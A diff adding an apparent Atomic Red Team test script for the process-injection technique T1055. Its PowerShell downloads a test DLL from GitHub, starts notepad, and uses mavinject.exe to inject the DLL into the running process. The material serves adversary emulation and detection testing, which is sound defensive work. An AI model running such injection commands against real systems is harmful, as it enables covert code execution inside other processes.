@@ -1,0 +1,14 @@
+#TechniqueName: Process Injection
+#AtomicTestName: Process Injection via mavinject.exe
+#Description: Windows 10 Utility To Inject DLLS.&&Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.&With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.&
+#Language: ps1
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1055\src\x64\T1055.dll) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "PathToAtomicsFolder\T1055\src\x64\T1055.dll"
+
+
+#commands
+$mypid = (Start-Process notepad -PassThru).id
+mavinject $mypid /INJECTRUNNING PathToAtomicsFolder\T1055\src\x64\T1055.dll
+
